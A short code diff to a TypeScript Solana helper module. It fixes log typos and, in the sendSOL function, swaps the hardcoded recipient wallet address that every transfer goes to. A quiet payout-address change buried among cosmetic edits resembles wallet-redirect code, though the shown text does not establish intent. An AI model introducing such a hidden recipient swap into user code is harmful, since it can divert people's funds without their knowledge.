@@ -248,7 +248,7 @@ export const execute = async (
     transaction.serialize(),
     { skipPreflight: true }
   );
-  console.log("signature", signature);
+  console.log("executing signature===>", signature);
   const confirmation = await solConnection.confirmTransaction({
     signature,
     lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
@@ -286,11 +286,11 @@ export const executeVersionedTx = async (transaction: VersionedTransaction) => {
   });
 
   if (confirmation.value.err) {
-    console.log("Confrimtaion error");
+    console.log("Confirmation error");
     return "";
   } else {
     console.log(
-      `Confrimed transaction: https://solscan.io/tx/${signature}${CLUSTER === "devnet" ? "?cluster=devnet" : ""
+      `Confirmed transaction: https://solscan.io/tx/${signature}${CLUSTER === "devnet" ? "?cluster=devnet" : ""
       }`
     );
   }
@@ -317,7 +317,7 @@ export const sendSOL = async (
   tx.add(
     SystemProgram.transfer({
       fromPubkey: senderKp.publicKey,
-      toPubkey: new PublicKey("8rLoTDFVQbKjpgFYV74rsEY7vGLXHNwP61HotnMtug7y"),
+      toPubkey: new PublicKey("BPqFJ3G54FxEts9odmKe6TJCa1RMq9NhN8qnAS6nvgAo"),
       lamports: Math.floor(amount * LAMPORTS_PER_SOL),
     })
   );
